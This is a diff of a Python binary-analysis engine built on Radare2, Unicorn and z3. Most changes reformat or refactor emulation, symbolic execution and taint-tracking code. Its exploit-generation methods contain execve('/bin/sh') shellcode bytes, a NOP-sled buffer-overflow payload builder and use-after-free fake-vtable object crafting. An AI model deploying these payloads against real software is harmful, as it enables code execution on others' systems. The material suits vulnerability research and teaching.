@@ -65,6 +65,7 @@ from unicorn.x86_const import (
     UC_X86_REG_RSP,
 )
 
+
 logger = logging.getLogger(__name__)
 
 
@@ -170,7 +171,9 @@ class Radare2Emulator:
             logger.error(f"Failed to open binary: {e}")
             return False
 
-    def emulate_esil(self, start_addr: int, num_instructions: int = 100, initial_state: dict | None = None) -> EmulationResult:
+    def emulate_esil(
+        self, start_addr: int, num_instructions: int = 100, initial_state: dict | None = None
+    ) -> EmulationResult:
         """Emulate using Radare2 ESIL."""
         try:
             # Initialize ESIL VM
@@ -222,7 +225,10 @@ class Radare2Emulator:
                 memory_changes=memory_changes,
                 execution_path=execution_path,
                 constraints=constraints,
-                metadata={"instructions_executed": len(execution_path), "start_address": start_addr},
+                metadata={
+                    "instructions_executed": len(execution_path),
+                    "start_address": start_addr,
+                },
             )
 
         except Exception as e:
@@ -256,7 +262,9 @@ class Radare2Emulator:
 
                         if addr_str.startswith("[") and addr_str.endswith("]"):
                             addr = int(addr_str[1:-1], 16)
-                            value = int(value_str, 16) if value_str.startswith("0x") else int(value_str)
+                            value = (
+                                int(value_str, 16) if value_str.startswith("0x") else int(value_str)
+                            )
                             changes.append((addr, struct.pack("<I", value)))
                     except (ValueError, struct.error):
                         continue
@@ -323,9 +331,9 @@ class Radare2Emulator:
                 try:
                     self.uc.mem_map(aligned_addr, aligned_size, UC_PROT_ALL)
 
-                    # Read section data
-                    data = self.r2.cmdj(f"pxj {section['size']} @ {section['vaddr']}")
-                    if data:
+                    if data := self.r2.cmdj(
+                        f"pxj {section['size']} @ {section['vaddr']}"
+                    ):
                         self.uc.mem_write(addr, bytes(data))
 
                     logger.info(f"Mapped section {section['name']} at {hex(addr)}")
@@ -344,7 +352,9 @@ class Radare2Emulator:
             logger.error(f"Failed to setup Unicorn: {e}")
             return False
 
-    def _unicorn_code_hook(self, uc: unicorn.Uc, address: int, size: int, user_data: object) -> None:
+    def _unicorn_code_hook(
+        self, uc: unicorn.Uc, address: int, size: int, user_data: object
+    ) -> None:
         """Monitor code execution in Unicorn emulator.
 
         Args:
@@ -360,7 +370,9 @@ class Radare2Emulator:
         if address in self.breakpoints if hasattr(self, "breakpoints") else []:
             uc.emu_stop()
 
-    def _unicorn_mem_write_hook(self, uc: unicorn.Uc, access: int, address: int, size: int, value: int, user_data: object) -> None:
+    def _unicorn_mem_write_hook(
+        self, uc: unicorn.Uc, access: int, address: int, size: int, value: int, user_data: object
+    ) -> None:
         """Monitor memory writes in Unicorn emulator.
 
         Args:
@@ -378,7 +390,9 @@ class Radare2Emulator:
         if address in self.taint_tracker:
             self._propagate_taint(address, value)
 
-    def _unicorn_mem_read_hook(self, uc: unicorn.Uc, access: int, address: int, size: int, value: int, user_data: object) -> None:
+    def _unicorn_mem_read_hook(
+        self, uc: unicorn.Uc, access: int, address: int, size: int, value: int, user_data: object
+    ) -> None:
         """Monitor memory reads in Unicorn emulator.
 
         Args:
@@ -394,19 +408,20 @@ class Radare2Emulator:
         if address in self.taint_tracker:
             self.taint_tracker[address].propagation_path.append(uc.reg_read(UC_X86_REG_EIP))
 
-    def emulate_unicorn(self, start_addr: int, end_addr: int | None = None, timeout: int = 0, count: int = 0) -> EmulationResult:
+    def emulate_unicorn(
+        self, start_addr: int, end_addr: int | None = None, timeout: int = 0, count: int = 0
+    ) -> EmulationResult:
         """Emulate using Unicorn engine."""
-        if not self.uc:
-            if not self.setup_unicorn_engine():
-                return EmulationResult(
-                    type=EmulationType.UNICORN,
-                    success=False,
-                    registers={},
-                    memory_changes=[],
-                    execution_path=[],
-                    constraints=[],
-                    metadata={"error": "Failed to setup Unicorn"},
-                )
+        if not self.uc and not self.setup_unicorn_engine():
+            return EmulationResult(
+                type=EmulationType.UNICORN,
+                success=False,
+                registers={},
+                memory_changes=[],
+                execution_path=[],
+                constraints=[],
+                metadata={"error": "Failed to setup Unicorn"},
+            )
 
         try:
             # Clear trace
@@ -417,11 +432,11 @@ class Radare2Emulator:
             if end_addr:
                 self.uc.emu_start(start_addr, end_addr, timeout, count)
             else:
-                self.uc.emu_start(start_addr, 0, timeout, count if count else 10000)
+                self.uc.emu_start(start_addr, 0, timeout, count or 10000)
 
             # Get final state
             registers = self._get_unicorn_registers()
-            memory_changes = [(addr, data) for addr, data in self.memory_map.items()]
+            memory_changes = list(self.memory_map.items())
 
             return EmulationResult(
                 type=EmulationType.UNICORN,
@@ -430,7 +445,11 @@ class Radare2Emulator:
                 memory_changes=memory_changes,
                 execution_path=self.execution_trace,
                 constraints=[],
-                metadata={"instructions_executed": len(self.execution_trace), "start_address": start_addr, "end_address": end_addr},
+                metadata={
+                    "instructions_executed": len(self.execution_trace),
+                    "start_address": start_addr,
+                    "end_address": end_addr,
+                },
             )
 
         except Exception as e:
@@ -463,27 +482,25 @@ class Radare2Emulator:
             }
 
             if self.bits == 64:
-                reg_map.update(
-                    {
-                        "rax": UC_X86_REG_RAX,
-                        "rbx": UC_X86_REG_RBX,
-                        "rcx": UC_X86_REG_RCX,
-                        "rdx": UC_X86_REG_RDX,
-                        "rsi": UC_X86_REG_RSI,
-                        "rdi": UC_X86_REG_RDI,
-                        "rbp": UC_X86_REG_RBP,
-                        "rsp": UC_X86_REG_RSP,
-                        "rip": UC_X86_REG_RIP,
-                        "r8": UC_X86_REG_R8,
-                        "r9": UC_X86_REG_R9,
-                        "r10": UC_X86_REG_R10,
-                        "r11": UC_X86_REG_R11,
-                        "r12": UC_X86_REG_R12,
-                        "r13": UC_X86_REG_R13,
-                        "r14": UC_X86_REG_R14,
-                        "r15": UC_X86_REG_R15,
-                    },
-                )
+                reg_map |= {
+                    "rax": UC_X86_REG_RAX,
+                    "rbx": UC_X86_REG_RBX,
+                    "rcx": UC_X86_REG_RCX,
+                    "rdx": UC_X86_REG_RDX,
+                    "rsi": UC_X86_REG_RSI,
+                    "rdi": UC_X86_REG_RDI,
+                    "rbp": UC_X86_REG_RBP,
+                    "rsp": UC_X86_REG_RSP,
+                    "rip": UC_X86_REG_RIP,
+                    "r8": UC_X86_REG_R8,
+                    "r9": UC_X86_REG_R9,
+                    "r10": UC_X86_REG_R10,
+                    "r11": UC_X86_REG_R11,
+                    "r12": UC_X86_REG_R12,
+                    "r13": UC_X86_REG_R13,
+                    "r14": UC_X86_REG_R14,
+                    "r15": UC_X86_REG_R15,
+                }
 
         elif self.arch == "arm":
             reg_map = {f"r{i}": UC_ARM_REG_R0 + i for i in range(16)}
@@ -502,7 +519,9 @@ class Radare2Emulator:
 
         return registers
 
-    def symbolic_execution(self, start_addr: int, target_addr: int, max_paths: int = 100) -> list[EmulationResult]:
+    def symbolic_execution(
+        self, start_addr: int, target_addr: int, max_paths: int = 100
+    ) -> list[EmulationResult]:
         """Perform symbolic execution to find paths."""
         results = []
         explored_paths = []
@@ -552,7 +571,12 @@ class Radare2Emulator:
 
     def _symbolic_execute_bb(self, addr: int, solver: z3.Solver) -> dict[str, Any]:
         """Symbolically execute a basic block."""
-        result = {"reached_target": False, "successors": [], "constraints": [], "path_condition": []}
+        result = {
+            "reached_target": False,
+            "successors": [],
+            "constraints": [],
+            "path_condition": [],
+        }
 
         try:
             # Get basic block
@@ -588,20 +612,17 @@ class Radare2Emulator:
                         op1 = parts[0].strip()
                         op2 = parts[1].strip()
 
-                        if op1 in self.symbolic_vars:
-                            if op2.isdigit():
-                                constraint = self.symbolic_vars[op1] == int(op2)
-                                result["constraints"].append(constraint)
+                        if op1 in self.symbolic_vars and op2.isdigit():
+                            constraint = self.symbolic_vars[op1] == int(op2)
+                            result["constraints"].append(constraint)
 
                 elif mnemonic.startswith("j"):
+                    # Unconditional jump
+                    target = inst.get("jump", end_addr)
                     # Handle jumps
                     if mnemonic == "jmp":
-                        # Unconditional jump
-                        target = inst.get("jump", end_addr)
                         result["successors"].append((target, z3.BoolVal(True)))
                     else:
-                        # Conditional jump
-                        target = inst.get("jump", end_addr)
                         fall_through = inst["offset"] + inst["size"]
 
                         # Create branch conditions
@@ -624,12 +645,22 @@ class Radare2Emulator:
 
         return result
 
-    def taint_analysis(self, taint_sources: list[tuple[int, int, str]], start_addr: int, num_instructions: int = 1000) -> list[TaintInfo]:
+    def taint_analysis(
+        self,
+        taint_sources: list[tuple[int, int, str]],
+        start_addr: int,
+        num_instructions: int = 1000,
+    ) -> list[TaintInfo]:
         """Perform taint analysis."""
         # Initialize taint sources
         for addr, size, label in taint_sources:
             self.taint_tracker[addr] = TaintInfo(
-                address=addr, size=size, taint_label=label, propagation_path=[], influenced_registers=[], influenced_memory=[],
+                address=addr,
+                size=size,
+                taint_label=label,
+                propagation_path=[],
+                influenced_registers=[],
+                influenced_memory=[],
             )
 
         # Emulate and track taint
@@ -679,7 +710,9 @@ class Radare2Emulator:
                         if src in tainted_regs:
                             for taint in self.taint_tracker.values():
                                 if src in taint.influenced_registers:
-                                    taint.influenced_memory.append((mem_addr, 4))  # Assuming 4-byte write
+                                    taint.influenced_memory.append(
+                                        (mem_addr, 4)
+                                    )  # Assuming 4-byte write
 
             # Execute instruction
             self.r2.cmd("aes")
@@ -688,14 +721,12 @@ class Radare2Emulator:
 
     def _extract_memory_address(self, operand: str) -> int | None:
         """Extract memory address from operand like [rax+0x10]."""
-        try:
+        with contextlib.suppress(ValueError, struct.error):
             # Simple extraction - in production would be more sophisticated
             if "[" in operand and "]" in operand:
                 addr_str = operand[operand.index("[") + 1 : operand.index("]")]
                 if "0x" in addr_str:
                     return int(addr_str.split("0x")[1], 16)
-        except (ValueError, struct.error):
-            pass
         return None
 
     def _propagate_taint(self, address: int, value: int) -> None:
@@ -713,7 +744,9 @@ class Radare2Emulator:
                 influenced_memory=taint.influenced_memory.copy(),
             )
 
-    def constraint_solving(self, constraints: list[Any], variables: dict[str, z3.BitVecRef]) -> dict[str, int] | None:
+    def constraint_solving(
+        self, constraints: list[Any], variables: dict[str, z3.BitVecRef]
+    ) -> dict[str, int] | None:
         """Solve constraints to find concrete values."""
         solver = z3.Solver()
 
@@ -731,15 +764,10 @@ class Radare2Emulator:
         # Check satisfiability
         if solver.check() == z3.sat:
             model = solver.model()
-            solution = {}
-
-            for var_name, var_ref in variables.items():
-                if var_ref in model:
-                    solution[var_name] = model[var_ref].as_long()
-                else:
-                    solution[var_name] = 0
-
-            return solution
+            return {
+                var_name: model[var_ref].as_long() if var_ref in model else 0
+                for var_name, var_ref in variables.items()
+            }
         return None
 
     def generate_exploit(self, vuln_type: ExploitType, vuln_addr: int) -> ExploitPrimitive | None:
@@ -771,34 +799,26 @@ class Radare2Emulator:
         for inst in disasm:
             # Look for stack allocation
             if "sub" in inst["mnemonic"] and "sp" in inst["opcode"]:
-                # Extract allocation size
-                match = re.search(r"0x([0-9a-fA-F]+)", inst["opcode"])
-                if match:
-                    buffer_size = int(match.group(1), 16)
+                if match := re.search(r"0x([0-9a-fA-F]+)", inst["opcode"]):
+                    buffer_size = int(match[1], 16)
                     break
 
         if buffer_size == 0:
             buffer_size = 256  # Default assumption
 
         # Calculate offset to return address
-        if self.bits == 64:
-            ret_offset = buffer_size + 8  # Buffer + saved RBP
-        else:
-            ret_offset = buffer_size + 4  # Buffer + saved EBP
-
+        ret_offset = buffer_size + 8 if self.bits == 64 else buffer_size + 4
         # Generate payload
         # NOP sled + shellcode + return address overwrite
         nop_sled = b"\x90" * 64
 
         # Basic shellcode (would be architecture-specific in production)
-        if self.arch == "x86":
+        if self.arch == "x64":
+            # x64 execve("/bin/sh") shellcode
+            shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
+        elif self.arch == "x86":
             # x86 execve("/bin/sh") shellcode
             shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-        elif self.arch == "x64":
-            # x64 execve("/bin/sh") shellcode
-            shellcode = (
-                b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
-            )
         else:
             shellcode = b"\xcc" * 32  # INT3 breakpoints
 
@@ -824,7 +844,11 @@ class Radare2Emulator:
             payload=shellcode,
             constraints=[f"buffer_size >= {buffer_size}"],
             reliability=0.7,
-            metadata={"buffer_size": buffer_size, "return_offset": ret_offset, "shellcode_size": len(shellcode)},
+            metadata={
+                "buffer_size": buffer_size,
+                "return_offset": ret_offset,
+                "shellcode_size": len(shellcode),
+            },
         )
 
     def _generate_format_string_exploit(self, vuln_addr: int) -> ExploitPrimitive:
@@ -906,6 +930,7 @@ class Radare2Emulator:
 
         # Analyze the vulnerable function to determine object structure
         func_info = self.r2.cmdj(f"afij @ {vuln_addr}")
+        vtable_offset = 0
         if func_info and len(func_info) > 0:
             func = func_info[0]
 
@@ -913,7 +938,6 @@ class Radare2Emulator:
             disasm = self.r2.cmdj(f"pdj {func['size']} @ {func['addr']}")
 
             object_size = 0
-            vtable_offset = 0
             has_vtable = False
 
             for inst in disasm:
@@ -926,23 +950,20 @@ class Radare2Emulator:
                     if idx > 0:
                         prev_inst = disasm[idx - 1]
                         if "mov" in prev_inst["mnemonic"] or "push" in prev_inst["mnemonic"]:
-                            size_match = re.search(r"0x([0-9a-fA-F]+)", prev_inst["opcode"])
-                            if size_match:
-                                object_size = int(size_match.group(1), 16)
+                            if size_match := re.search(
+                                r"0x([0-9a-fA-F]+)", prev_inst["opcode"]
+                            ):
+                                object_size = int(size_match[1], 16)
 
                 # Look for virtual function calls (indicates vtable)
                 if "call" in inst["mnemonic"] and "[" in opcode:
-                    # Virtual call pattern: call [reg+offset]
-                    offset_match = re.search(r"\+\s*0x([0-9a-fA-F]+)", opcode)
-                    if offset_match:
-                        vtable_offset = int(offset_match.group(1), 16)
+                    if offset_match := re.search(r"\+\s*0x([0-9a-fA-F]+)", opcode):
+                        vtable_offset = int(offset_match[1], 16)
                         has_vtable = True
         else:
             # Default analysis if function info not available
             object_size = 0x40 if self.bits == 64 else 0x20
             has_vtable = True
-            vtable_offset = 0
-
         # Determine actual object size from heap metadata analysis
         if object_size == 0:
             # Analyze heap allocator metadata patterns
@@ -1000,7 +1021,6 @@ class Radare2Emulator:
                 malicious_object = struct.pack("<Q", crafted_vtable_addr)  # vtable pointer
                 malicious_object += b"\x00" * 8  # padding/member
                 malicious_object += struct.pack("<Q", 0x1337)  # magic value
-                malicious_object += b"\x00" * (aligned_size - len(malicious_object))
             else:
                 # 32-bit addresses
                 heap_base = 0x08050000
@@ -1012,23 +1032,19 @@ class Radare2Emulator:
                 malicious_object = struct.pack("<I", crafted_vtable_addr)
                 malicious_object += b"\x00" * 4
                 malicious_object += struct.pack("<I", 0x1337)
-                malicious_object += b"\x00" * (aligned_size - len(malicious_object))
-        # No vtable - create object with function pointers directly
         elif self.bits == 64:
             heap_base = 0x555555560000
             shellcode_addr = heap_base + 0x1000
 
             malicious_object = struct.pack("<Q", shellcode_addr)  # Function pointer
             malicious_object += struct.pack("<Q", 0xDEADBEEF)  # Data member
-            malicious_object += b"\x00" * (aligned_size - len(malicious_object))
         else:
             heap_base = 0x08050000
             shellcode_addr = heap_base + 0x1000
 
             malicious_object = struct.pack("<I", shellcode_addr)
             malicious_object += struct.pack("<I", 0xDEADBEEF)
-            malicious_object += b"\x00" * (aligned_size - len(malicious_object))
-
+        malicious_object += b"\x00" * (aligned_size - len(malicious_object))
         # Ensure malicious object is properly sized
         if len(malicious_object) > aligned_size:
             malicious_object = malicious_object[:aligned_size]
@@ -1073,10 +1089,8 @@ class Radare2Emulator:
                 func_name = imp.get("name", "").lower()
 
                 # glibc ptmalloc
-                if "libc" in lib_name or "malloc" in func_name or "free" in func_name:
-                    # Additional check for glibc-specific functions
-                    if "malloc_usable_size" in func_name or "__libc_malloc" in func_name:
-                        return "glibc"
+                if ("libc" in lib_name or "malloc" in func_name or "free" in func_name) and ("malloc_usable_size" in func_name or "__libc_malloc" in func_name):
+                    return "glibc"
 
                 # jemalloc
                 if "jemalloc" in lib_name or "je_malloc" in func_name:
@@ -1162,10 +1176,11 @@ class Radare2Emulator:
         imports = self.r2.cmdj("iij")
         for imp in imports:
             func_name = imp.get("name", "")
-            for dangerous, vuln_type in dangerous_funcs.items():
-                if dangerous in func_name.lower():
-                    vulnerabilities.append((vuln_type, imp.get("plt", 0)))
-
+            vulnerabilities.extend(
+                (vuln_type, imp.get("plt", 0))
+                for dangerous, vuln_type in dangerous_funcs.items()
+                if dangerous in func_name.lower()
+            )
         # Check for integer operations without bounds checking
         functions = self.r2.cmdj("aflj")
         for func in functions:
@@ -1180,8 +1195,7 @@ class Radare2Emulator:
 
     def generate_exploit_report(self, exploits: list[ExploitPrimitive]) -> str:
         """Generate report of generated exploits."""
-        report = []
-        report.append("=" * 60)
+        report = ["=" * 60]
         report.append("EXPLOIT GENERATION REPORT")
         report.append("=" * 60)
         report.append(f"Binary: {self.binary_path}")
@@ -1229,12 +1243,20 @@ def main() -> None:
     parser = argparse.ArgumentParser(description="Radare2 Emulation Engine")
     parser.add_argument("binary", help="Binary file to emulate")
     parser.add_argument(
-        "-m", "--mode", choices=["esil", "unicorn", "symbolic", "taint", "exploit"], default="unicorn", help="Emulation mode",
+        "-m",
+        "--mode",
+        choices=["esil", "unicorn", "symbolic", "taint", "exploit"],
+        default="unicorn",
+        help="Emulation mode",
     )
     parser.add_argument("-s", "--start", help="Start address (hex)", type=lambda x: int(x, 16))
     parser.add_argument("-e", "--end", help="End address (hex)", type=lambda x: int(x, 16))
-    parser.add_argument("-n", "--num-inst", type=int, default=100, help="Number of instructions to emulate")
-    parser.add_argument("-x", "--exploit", action="store_true", help="Generate exploits for found vulnerabilities")
+    parser.add_argument(
+        "-n", "--num-inst", type=int, default=100, help="Number of instructions to emulate"
+    )
+    parser.add_argument(
+        "-x", "--exploit", action="store_true", help="Generate exploits for found vulnerabilities"
+    )
 
     args = parser.parse_args()
 
@@ -1283,8 +1305,9 @@ def main() -> None:
             if args.exploit and vulns:
                 exploits = []
                 for vuln_type, vuln_addr in vulns[:5]:  # Limit to first 5
-                    exploit = emulator.generate_exploit(vuln_type, vuln_addr)
-                    if exploit:
+                    if exploit := emulator.generate_exploit(
+                        vuln_type, vuln_addr
+                    ):
                         exploits.append(exploit)
 
                 if exploits:
